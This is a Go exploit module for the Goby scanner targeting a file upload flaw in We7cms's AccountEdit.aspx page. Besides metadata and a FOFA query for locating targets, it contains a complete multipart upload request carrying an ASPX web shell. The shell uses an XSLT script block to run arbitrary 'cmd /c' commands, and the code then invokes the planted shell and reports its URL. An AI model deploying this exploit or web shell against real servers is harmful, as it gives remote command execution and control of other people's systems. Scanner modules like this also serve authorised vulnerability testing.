package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WestEngine-We7 AccountEdit File Upload",
    "Description": "We7cms does not filter the script type of the uploaded file in the upload avatar of the member center, so it can directly upload ASPX script, getshell.",
    "Impact": "WestEngine-We7 AccountEdit File Upload",
    "Recommendation": "<p>Limit upload file types</p>",
    "Product": "We7cms",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "微擎系统 AccountEdit 文件 文件上传漏洞",
            "Description": "<p>微擎是基于目前最流行的WEB2.0的架构（php+mysql）。</p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://wiki.w7.cc/chapter/35?id=370\">https://wiki.w7.cc/chapter/35?id=370</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "We7cms",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "WestEngine-We7 AccountEdit File Upload",
            "Description": "We7cms does not filter the script type of the uploaded file in the upload avatar of the member center, so it can directly upload ASPX script, getshell.",
            "Impact": "WestEngine-We7 AccountEdit File Upload",
            "Recommendation": "<p>Limit upload file types<br></p>",
            "Product": "We7cms",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "(body=\"/Widgets/WidgetCollection/\")",
    "GobyQuery": "(body=\"/Widgets/WidgetCollection/\")",
    "Author": "165287694@qq.com",
    "Homepage": "http://www.we7.cn/",
    "DisclosureDate": "2021-04-08",
    "References": [
        "https://www.daimaqu.cn/view/258227.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "We7"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/User/AccountEdit.aspx"
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + uri); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "基本信息")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/User/AccountEdit.aspx"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------7e532d6160316")
			cfg.VerifyTls = false
			cfg.Data = "-----------------------------7e532d6160316\nContent-Disposition: form-data; name=\"__VIEWSTATE\"\n\n/wEPDwULLTEzMDg5OTY2NTcPZBYCZg9kFgICCQ9kFgICARAWAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWQWAgIBDw8WAh4EVGV4dAWKAjxMSSBjbGFzcz1UYWJJbiBpZD10YWIxIHN0eWxlPSdkaXNwbGF5Oic+PEE+5Z+65pys5L+h5oGvPC9BPiA8L0xJPjxMSSBjbGFzcz1UYWJPdXQgaWQ9dGFiNCAgc3R5bGU9J2Rpc3BsYXk6Jz48QSAgaHJlZj0vVXNlci9BY2NvdW50RWRpdC5hc3B4P3RhYj00PumAiemhuTwvQT4gPC9MST48TEkgY2xhc3M9VGFiT3V0IGlkPXRhYjUgIHN0eWxlPSdkaXNwbGF5Oic+PEEgIGhyZWY9L1VzZXIvQWNjb3VudEVkaXQuYXNweD90YWI9NT7lr4bnoIHorr7nva48L0E+IDwvTEk+ZGRkeF0Cji3RkJKFkgwUAnE1IRTBHT0=\n-----------------------------7e532d6160316\nContent-Disposition: form-data; name=\"__VIEWSTATEGENERATOR\"\n\nB4FE6035\n-----------------------------7e532d6160316\nContent-Disposition: form-data; name=\"__EVENTVALIDATION\"\n\n/wEWBgLMgeKmBQK8ko+sCwLj7JnWDwKavpXnAwKmyMubDAKW1typA4Ixq1i58zhCij+9M4gpVRM+76SE\n-----------------------------7e532d6160316\nContent-Disposition: form-data; name=\"ctl00$MyContentPlaceHolder$ctl00$upload\"; filename=\"test.aspx\"\nContent-Type: text/plain\n\n<%@page language=\"C#\"%>\n<%@ import Namespace=\"System.IO\"%>\n<%@ import Namespace=\"System.Xml\"%>\n<%@ import Namespace=\"System.Xml.Xsl\"%>\n<%\nstring xml=@\"<?xml version=\"\"1.0\"\"?><root>test</root>\";\nstring xslt=@\"<?xml version='1.0'?>\n<xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msxsl=\"\"urn:schemas-microsoft-com:xslt\"\" xmlns:zcg=\"\"zcgonvh\"\">\n    <msxsl:script language=\"\"JScript\"\" implements-prefix=\"\"zcg\"\">\n    <msxsl:assembly name=\"\"mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\"/>\n    <msxsl:assembly name=\"\"System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\"/>\n    <msxsl:assembly name=\"\"System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\"/>\n    <msxsl:assembly name=\"\"System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\"/>\n        <![CDATA[function xml(){\n        var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;\n        var command = Request.Item['cmd'];\n        var r = new ActiveXObject(\"\"WScript.Shell\"\").Exec(\"\"cmd /c \"\"+command);\n        var OutStream = r.StdOut;\n        var Str = \"\"\"\";\n        while (!OutStream.atEndOfStream) {\n            Str = Str + OutStream.readAll();\n            }\n        Response.Write(\"\"<pre>\"\"+Str+\"\"</pre>\"\");\n        }]]>\n    </msxsl:script>\n<xsl:template match=\"\"/root\"\">\n    <xsl:value-of select=\"\"zcg:xml()\"\"/>\n</xsl:template>\n</xsl:stylesheet>\";\nXmlDocument xmldoc=new XmlDocument();\nxmldoc.LoadXml(xml);\nXmlDocument xsldoc=new XmlDocument();\nxsldoc.LoadXml(xslt);\nXsltSettings xslt_settings = new XsltSettings(false, true);\nxslt_settings.EnableScript = true;\ntry{\n    XslCompiledTransform xct=new XslCompiledTransform();\n    xct.Load(xsldoc,xslt_settings,new XmlUrlResolver());\n    xct.Transform(xmldoc,null,new MemoryStream());\n}\ncatch (Exception e){\n    Response.Write(\"Error\");\n}\n%>\n-----------------------------7e532d6160316\nContent-Disposition: form-data; name=\"ctl00$MyContentPlaceHolder$ctl00$bttnUpload\"\n\n上传图片\n-----------------------------7e532d6160316\nContent-Disposition: form-data; name=\"ctl00$MyContentPlaceHolder$ctl00$txtLastName\"\n\n\n-----------------------------7e532d6160316\nContent-Disposition: form-data; name=\"ctl00$MyContentPlaceHolder$ctl00$txtEmail\"\n\n\n-----------------------------7e532d6160316--\n"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "/_data/Uploads/") {
					reg := regexp.MustCompile(`/_data/Uploads/(.*?)aspx`)
					vurl := reg.FindString(resp.Utf8Html)
					cmd := ss.Params["cmd"].(string)
					vurll := vurl + "?cmd=" + cmd
					if resp2, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + vurll); err == nil {
						expResult.Success = true
						reg2 := regexp.MustCompile(`(?s)<pre>(.*?)</pre>`)
						ccmd := reg2.FindString(resp2.Utf8Html)
						webshell := expResult.HostInfo.FixedHostInfo + vurll
						expResult.Output = ccmd + "\n" + "webshell:" + webshell
					}
				}
			}
			return expResult
		},
	))
}
